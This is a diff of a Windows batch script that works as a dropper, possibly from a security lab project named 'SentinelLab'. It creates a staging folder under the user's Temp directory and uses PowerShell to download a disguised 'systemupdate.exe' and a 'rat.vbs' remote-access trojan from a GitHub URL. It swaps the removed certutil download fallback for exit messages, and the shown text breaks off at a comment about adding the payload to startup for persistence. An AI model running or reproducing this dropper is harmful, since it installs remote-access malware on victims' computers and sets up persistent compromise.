@@ -1,19 +1,21 @@
 @echo off
-:: Create hidden folder for payloads
-set "payloadFolder=%ProgramData%\HR_Update"
+:: Use dynamic user profile directory (no need to hard-code username)
+set "payloadFolder=%USERPROFILE%\AppData\Local\Temp\HR_Update"
 mkdir "%payloadFolder%"
 
 :: Attempt to download with PowerShell
 powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/systemupdate.exe -OutFile '%payloadFolder%\systemupdate.exe'"
 powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/rat.vbs -OutFile '%payloadFolder%\rat.vbs'"
 
-:: If PowerShell failed (files don’t exist), try certutil fallback
+:: Check if the files exist and ensure they're downloaded
 if not exist "%payloadFolder%\systemupdate.exe" (
-    certutil -urlcache -split -f https://raw.githubusercontent.com/Oligo12/SentinelLab/main/systemupdate.exe "%payloadFolder%\systemupdate.exe"
+    echo Failed to download systemupdate.exe
+    exit /b
 )
 
 if not exist "%payloadFolder%\rat.vbs" (
-    certutil -urlcache -split -f https://raw.githubusercontent.com/Oligo12/SentinelLab/main/rat.vbs "%payloadFolder%\rat.vbs"
+    echo Failed to download rat.vbs
+    exit /b
 )
 
 :: Add to startup (for persistence)
